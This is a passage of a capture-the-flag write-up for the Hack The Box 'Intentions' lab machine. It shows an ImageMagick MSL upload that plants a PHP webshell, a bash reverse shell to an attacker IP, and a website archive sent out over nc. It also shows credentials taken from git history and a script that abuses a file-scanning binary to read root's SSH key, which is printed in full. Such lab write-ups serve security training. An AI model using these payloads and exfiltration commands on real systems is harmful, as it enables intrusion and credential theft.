X-XSRF-TOKEN: eyJpdiI6IlFsTDZ0NFErVlM0TlJibWxxNjloS0E9PSIsInZhbHVlIjoiRDVTME5uRGxCVVByWm5EbUs0d3oxVkRXYVFpMDNFWTY1N2NFM3JkVEZmd0o3RE5jNDNSS1V3ZjlLWmdOQVFQOHZUbE9LYWo5MlNBclpzWkFHZE1CKzNWWDN2UG9XMEhvRUdxTWNwTVJydkhBQ1JaYjhRLzIyd0dtTnR4MWFTWWMiLCJtYWMiOiIxM2RhZTQzZTRiY2VmZTRiNzY1Y2I5MWZjZWVhM2QxZjgxNGNiNjU4OTlkMTY5YmQxZmU1M2I3YzdmMDg5NTI3IiwidGFnIjoiIn0=
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: http://10.10.11.220
Referer: http://10.10.11.220/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNzQ1NDM5OTI2LCJleHAiOjE3NDU0NjE1MjYsIm5iZiI6MTc0NTQzOTkyNiwianRpIjoiZDBEbnRIMVhqU0J6VjdnNiIsInN1YiI6IjEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.2AMAvGUsP_LEGgrASdpSu8lhgTlB_eDL2Bp5CLiYato; XSRF-TOKEN=eyJpdiI6IlFsTDZ0NFErVlM0TlJibWxxNjloS0E9PSIsInZhbHVlIjoiRDVTME5uRGxCVVByWm5EbUs0d3oxVkRXYVFpMDNFWTY1N2NFM3JkVEZmd0o3RE5jNDNSS1V3ZjlLWmdOQVFQOHZUbE9LYWo5MlNBclpzWkFHZE1CKzNWWDN2UG9XMEhvRUdxTWNwTVJydkhBQ1JaYjhRLzIyd0dtTnR4MWFTWWMiLCJtYWMiOiIxM2RhZTQzZTRiY2VmZTRiNzY1Y2I5MWZjZWVhM2QxZjgxNGNiNjU4OTlkMTY5YmQxZmU1M2I3YzdmMDg5NTI3IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkJHNkV2dFNZSmJtM1RNUHVqQTRvWXc9PSIsInZhbHVlIjoiNlk5eURjaXpPaGVzTWFIMDVCQUhVRXlZZWVVRlJiRjd3c3NqQnlRN1pGTWlZMEpWazBFSlhuQVNROHJGTk1XemxCSEdReHhSclNrbFUzbis1MVdHbU55dEViYUU1TDd2R2lSdmNNcWZxSVdaWEVSWml0OXpkTWpRbmhBdWtlMXIiLCJtYWMiOiJiY2UyYjAwYWY4OWQyYmVjMzk4ZmU3MDgyMzJlOWE1MGJjMDY5MDk5MzlkYjI4NjcxODExYTZhMzc3ZGUzNTY4IiwidGFnIjoiIn0%3D
Connection: keep-alive

{"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg","effect":"charcoal"}
```

I’ll first try to move the `path` and `effect` parameters from the POST body to the GET parameters. It’ll still be a POST request, but if this works, that makes it easier for me to isolate the file upload in the POST body:

<figure><img src="../../.gitbook/assets/image (3011).png" alt=""><figcaption></figcaption></figure>

That does work. I’ll want to upload a file that will be temporarily written to `/tmp/php*` by PHP. To do that, I’ll use a multipart form data by setting the `Content-Type` header. By giving it `filename` and `Content-Type` attributes, PHP will handle it as a file.

The file will be a modified version of what’s in the blog post:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_GET['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/0xdf.php" />
</image>
```

Because the admin page gives both the path on the webserver and the path on disk

<figure><img src="../../.gitbook/assets/image (3012).png" alt=""><figcaption></figcaption></figure>

By writing to `/var/www/html/intentions/storage/app/public/`, I can expect to find the file in `/storage/`. I could also try the `animals` directory, but it doesn’t work (www-data doesn’t have write access).

Now I’ll edit the request headers to add form data for a file upload. My full payload looks like

```json
POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=abcd HTTP/1.1
Host: 10.10.11.220
Content-Length: 379
X-XSRF-TOKEN: eyJpdiI6IlFsTDZ0NFErVlM0TlJibWxxNjloS0E9PSIsInZhbHVlIjoiRDVTME5uRGxCVVByWm5EbUs0d3oxVkRXYVFpMDNFWTY1N2NFM3JkVEZmd0o3RE5jNDNSS1V3ZjlLWmdOQVFQOHZUbE9LYWo5MlNBclpzWkFHZE1CKzNWWDN2UG9XMEhvRUdxTWNwTVJydkhBQ1JaYjhRLzIyd0dtTnR4MWFTWWMiLCJtYWMiOiIxM2RhZTQzZTRiY2VmZTRiNzY1Y2I5MWZjZWVhM2QxZjgxNGNiNjU4OTlkMTY5YmQxZmU1M2I3YzdmMDg5NTI3IiwidGFnIjoiIn0=
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNzQ1NDM5OTI2LCJleHAiOjE3NDU0NjE1MjYsIm5iZiI6MTc0NTQzOTkyNiwianRpIjoiZDBEbnRIMVhqU0J6VjdnNiIsInN1YiI6IjEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.2AMAvGUsP_LEGgrASdpSu8lhgTlB_eDL2Bp5CLiYato; XSRF-TOKEN=eyJpdiI6IlFsTDZ0NFErVlM0TlJibWxxNjloS0E9PSIsInZhbHVlIjoiRDVTME5uRGxCVVByWm5EbUs0d3oxVkRXYVFpMDNFWTY1N2NFM3JkVEZmd0o3RE5jNDNSS1V3ZjlLWmdOQVFQOHZUbE9LYWo5MlNBclpzWkFHZE1CKzNWWDN2UG9XMEhvRUdxTWNwTVJydkhBQ1JaYjhRLzIyd0dtTnR4MWFTWWMiLCJtYWMiOiIxM2RhZTQzZTRiY2VmZTRiNzY1Y2I5MWZjZWVhM2QxZjgxNGNiNjU4OTlkMTY5YmQxZmU1M2I3YzdmMDg5NTI3IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkJHNkV2dFNZSmJtM1RNUHVqQTRvWXc9PSIsInZhbHVlIjoiNlk5eURjaXpPaGVzTWFIMDVCQUhVRXlZZWVVRlJiRjd3c3NqQnlRN1pGTWlZMEpWazBFSlhuQVNROHJGTk1XemxCSEdReHhSclNrbFUzbis1MVdHbU55dEViYUU1TDd2R2lSdmNNcWZxSVdaWEVSWml0OXpkTWpRbmhBdWtlMXIiLCJtYWMiOiJiY2UyYjAwYWY4OWQyYmVjMzk4ZmU3MDgyMzJlOWE1MGJjMDY5MDk5MzlkYjI4NjcxODExYTZhMzc3ZGUzNTY4IiwidGFnIjoiIn0%3D
Connection: close
Content-Type: multipart/form-data; boundary=------------------------abcd

--------------------------abcd
Content-Disposition: form-data; name="file"; filename="test.msl"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/0xdf.php" />
</image>
--------------------------abcd
```

I can use anything for `name`, as I just need PHP temporarily store it in `/tmp` before it realizes it’s not needed.

On sending, the request hangs for a second, and then returns a 502 Bad Gateway failure:

<figure><img src="../../.gitbook/assets/image (3013).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3014).png" alt=""><figcaption></figcaption></figure>

This is a sign of success, as deimos`.php` is there:

```shellscript
┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions]
└─$ curl http://10.10.11.220/storage/0xdf.php?cmd=id                                                                              
caption:uid=33(www-data) gid=33(www-data) groups=33(www-data)
 CAPTION 120x120 120x120+0+0 16-bit sRGB 2.640u 0:02.655
```

If there is something wrong with the request, the response looks like this:

```json
HTTP/1.1 422 Unprocessable Content
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-cache, private
Date: Thu, 12 Oct 2023 21:47:03 GMT
X-RateLimit-Limit: 3600
X-RateLimit-Remaining: 3599
Access-Control-Allow-Origin: *
Content-Length: 14

bad image path
```

I came across this several ways. One way this comes up is copying the POC from the blog, which comes with extra spaces in the payload and cause this result

### <mark style="color:yellow;">Shell</mark>

To get a shell from the webshell, I’ll just send a bash reverse shell payload. I’ll put it in the POST body (I used `$_REQUEST` to read `cmd` from either GET parameters or POST body)

```shellscript
┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions]
└─$ curl http://10.10.11.220/storage/0xdf.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.5/9001 0>%261"'
```

This just hangs but at nc:

```shellscript
┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions]
└─$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.220] 57472
bash: cannot set terminal process group (1070): Inappropriate ioctl for device
bash: no job control in this shell
www-data@intentions:~/html/intentions/storage/app/public$ whoami
whoami
www-data
```

I'll upgrade the shell

```shellscript
www-data@intentions:~/html/intentions/storage/app/public$ script /dev/null -c bash
<ntions/storage/app/public$ script /dev/null -c bash      
Script started, output log file is '/dev/null'.
www-data@intentions:~/html/intentions/storage/app/public$ ^Z
[1]+  Stopped                 nc -nvlp 9001

┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions]
└─$ stty raw -echo; fg
nc -nvlp 9001                                                                                                                           
                                                                                                                                        
<intentions/storage/app/public$ export TERM=xterm-256color                                                                              
www-data@intentions:~/html/intentions/storage/app/public$ export SHELL=bash                                                             
36w-data@intentions:~/html/intentions/storage/app/public$ stty rows 34 columns 136
```

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

There are three users with home directories

```shellscript
www-data@intentions:/home$ ls
greg  legal  steven
```

www-data doesn’t have privilege to access any of them.

www-data’s home directory is `/var/www`, and the only thing in it is the website, in `/var/www/html/intentions`

```shellscript
www-data@intentions:~/html/intentions$ ls -la
total 820
drwxr-xr-x  14 root     root       4096 Feb  2  2023 .
drwxr-xr-x   3 root     root       4096 Feb  2  2023 ..
-rw-r--r--   1 root     root       1068 Feb  2  2023 .env
drwxr-xr-x   8 root     root       4096 Feb  3  2023 .git
-rw-r--r--   1 root     root       3958 Apr 12  2022 README.md
drwxr-xr-x   7 root     root       4096 Apr 12  2022 app
-rwxr-xr-x   1 root     root       1686 Apr 12  2022 artisan
drwxr-xr-x   3 root     root       4096 Apr 12  2022 bootstrap
-rw-r--r--   1 root     root       1815 Jan 29  2023 composer.json
-rw-r--r--   1 root     root     300400 Jan 29  2023 composer.lock
drwxr-xr-x   2 root     root       4096 Jan 29  2023 config
drwxr-xr-x   5 root     root       4096 Apr 12  2022 database
-rw-r--r--   1 root     root       1629 Jan 29  2023 docker-compose.yml
drwxr-xr-x 534 root     root      20480 Jan 30  2023 node_modules
-rw-r--r--   1 root     root     420902 Jan 30  2023 package-lock.json
-rw-r--r--   1 root     root        891 Jan 30  2023 package.json
-rw-r--r--   1 root     root       1139 Jan 29  2023 phpunit.xml
drwxr-xr-x   5 www-data www-data   4096 Feb  3  2023 public
drwxr-xr-x   7 root     root       4096 Jan 29  2023 resources
drwxr-xr-x   2 root     root       4096 Jun 19  2023 routes
-rw-r--r--   1 root     root        569 Apr 12  2022 server.php
drwxr-xr-x   5 www-data www-data   4096 Apr 12  2022 storage
drwxr-xr-x   4 root     root       4096 Apr 12  2022 tests
drwxr-xr-x  45 root     root       4096 Jan 29  2023 vendor
-rw-r--r--   1 root     root        722 Feb  2  2023 webpack.mix.js
```

There is a Git repo (the `.git` directory) that is readable but not writable by www-data. The permissions on the directory don’t allow www-data to run `git` commands

```shellscript
www-data@intentions:~/html/intentions$ git log
fatal: detected dubious ownership in repository at '/var/www/html/intentions'
To add an exception for this directory, call:

        git config --global --add safe.directory /var/www/html/intentions
www-data@intentions:~/html/intentions$ git config --global --add safe.directory /var/www/html/intentions
error: could not lock config file /var/www/.gitconfig: Permission denied
```

### <mark style="color:$primary;">Git Repo</mark>

I’ll bundle the entire website (for low bandwidth situations the `.git` folder would do)

```shellscript
www-data@intentions:~/html/intentions$ tar -cf /tmp/site.tar .
```

I’ll exfil that back over `nc`

{% code overflow="wrap" %}
```shellscript
www-data@intentions:~/html/intentions$ cat /tmp/site.tar | nc 10.10.16.5 9002
```
{% endcode %}

On my host

```shellscript
┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions]
└─$ nc -nvlp 9002 > site.tar                                                                                                            
listening on [any] 9002 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.220] 49302
^C
┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions]
└─$ mkdir site                                                                                                                          
┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions]
└─$ cd site/                                                                                                                            
┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions/site]
└─$ tar xf ../site.tar
```

The repo has four commits

```shellscript
┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions/site]
└─$ git log --oneline                                                                                                                   
1f29dfd (HEAD -> master) Fix webpack for production
f7c903a Test cases did not work on steve's local database, switching to user factory per his advice
36b4287 Adding test cases for the API!
d7ef022 Initial v2 commit
```

Exploring the differences in the commits (with `git diff commit1 commit2`), `/tests/Feature/Helper.php` is added in the second commit, “Adding test cases for the API!”

```shellscript
┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions/site]
└─$ git diff d7ef022 36b4287 tests/Feature/Helper.php                                                                                   
diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
new file mode 100644
index 0000000..f57e37b
--- /dev/null
+++ b/tests/Feature/Helper.php
@@ -0,0 +1,19 @@
+<?php
+
+namespace Tests\Feature;
+use Tests\TestCase;
+use App\Models\User;
+use Auth;
+class Helper extends TestCase
+{
+    public static function getToken($test, $admin = false) {
+        if($admin) {
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
+        } 
+        else {
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
+        }
+    }
+}
```

This file is mean to test logging into the API, and it's using hardcoded credentials for greg. In the third commit, the creds are removed

```shellscript
┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions/site]
└─$ git diff 36b4287 f7c903a tests/Feature/Helper.php                                                                           
diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
index f57e37b..0586d51 100644
--- a/tests/Feature/Helper.php
+++ b/tests/Feature/Helper.php
@@ -8,12 +8,14 @@ class Helper extends TestCase
 {
     public static function getToken($test, $admin = false) {
         if($admin) {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->admin()->create();
         } 
         else {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->create();
         }
+        
+        $token = Auth::login($user);
+        $user->delete();
+        return $token;
     }
 }
```

I noted earlier that greg was a user on this box with a home directory. These creds work for grep with `su`

```shellscript
www-data@intentions:~/html/intentions$ su - greg
Password: 
$ whoami
greg
```

And over SSH

```shellscript
┌──(kali㉿kali)-[~/CyberTraining/HTB/Intentions/site]
└─$ sshpass -p 'Gr3g1sTh3B3stDev3l0per!1998!' ssh greg@10.10.11.220                                                                  
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Apr 24 02:35:35 AM UTC 2025

  System load:           0.0
  Usage of /:            62.6% of 6.30GB
  Memory usage:          10%
  Swap usage:            0%
  Processes:             225
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.220
  IPv6 address for eth0: dead:beef::250:56ff:feb0:9c6a


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

12 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Apr 24 02:35:36 2025 from 10.10.16.5
$ whoami
greg
```

greg’s shell is set to `sh`, but running `bash` will return a better experience

```shellscript
$ bash
greg@intentions:~$
greg@intentions:~$ cat user.txt 
30494d98265f8de04292bba8b4922675
```

### <mark style="color:$primary;">Checking Capabilities</mark>

```shellscript
getcap -r / 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (3015).png" alt=""><figcaption></figcaption></figure>

There is one file that has a unusual capability, `/opt/scanner/scanner` is worth looking into. With `CAP_DAC_READ_SEARCH`, it can read any file on the host ([man capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html))

#### <mark style="color:yellow;">CAP\_DAC\_READ\_SEARCH</mark>

* _Bypass file read permission checks and directory read and execute permission checks;_
* _invoke open\_by\_handle\_at(2);_
* _use the linkat(2) AT\_EMPTY\_PATH flag to create a link to a file referred to by a file descriptor_

greg’s home directory has two files that reference DMCA (presumably the [Digital Millennium Copyright Act](https://en.wikipedia.org/wiki/Digital_Millennium_Copyright_Act))

<figure><img src="../../.gitbook/assets/image (3016).png" alt=""><figcaption></figcaption></figure>

`dmca_hashes.test` is a list of ids and hashes

<figure><img src="../../.gitbook/assets/image (3017).png" alt=""><figcaption></figcaption></figure>

`dmca_check.sh` just runs the scanner identified above

<figure><img src="../../.gitbook/assets/image (3018).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Scanner</mark>

This file has a help function

<figure><img src="../../.gitbook/assets/image (3019).png" alt=""><figcaption></figcaption></figure>

It is able to MD5 hash files and compare them against a give list of hashes. It in fact does not work like it says it does, but the broken part is just the full file hash (I’ll play with that in [Beyond Root](https://0xdf.gitlab.io/2023/10/14/htb-intentions.html#beyond-root)).

It also has the ability to hash only the first X characters of a file. `-p` will be useful because it will print the calculated hash of the file or portion of the file.

So for example

```shellscript
/opt/scanner/scanner -c user.txt -p -l 5 -s whatever
```

<figure><img src="../../.gitbook/assets/image (3021).png" alt=""><figcaption></figcaption></figure>

Here I’m calling `scanner` with:

* `-c user.txt` - target `user.txt`
* `-p` - print debug
* `-l 5` - only consider the first 5 characters
* `-s whatever` - alert if the result matches “whatever”, which will never succeed, but that’s ok

The debug message prints the hash, which matches the MD5 of the first five characters of the file

### <mark style="color:$primary;">Arbitrary File Read</mark>

If I can get the hash of the first byte of a file, then I can brute force all possible bytes and take their hashes and compare to get a match. Then I can do the same with the first two bytes, first three bytes, etc, until I have the full file.

This is more of a programming exercise than anything else. In [this video](https://www.youtube.com/watch?v=IkUmlFklWEs) I’ll walk through creating a Python script to abuse this binary to get file read:

```python
#!/usr/bin/env python3

import hashlib
import subprocess
import sys


def get_hash(fn, n):
    """Get the target hash for n length characters of 
    filename fn"""
    proc = subprocess.run(f"/opt/scanner/scanner -c {fn} -s whatever -p -l {n}".split(),
                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        return proc.stdout.decode().strip().split()[-1]
    except IndexError:
        return None


def get_next_char(output, target):
    """Take the current output and figure out what the
    next character will be given the target hash"""
    for i in range(256):
        if target == hashlib.md5(output + chr(i).encode()).hexdigest():
            return chr(i).encode()


output = b""
fn = sys.argv[1]

while True:
    target = get_hash(fn, len(output) + 1)
    next_char = get_next_char(output, target)
    if next_char is None:
        break
    output += next_char
    print(next_char.decode(), end="")
```

```shellscript
greg@intentions:~$ python3 read_file.py /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

<figure><img src="../../.gitbook/assets/image (3022).png" alt=""><figcaption></figcaption></figure>
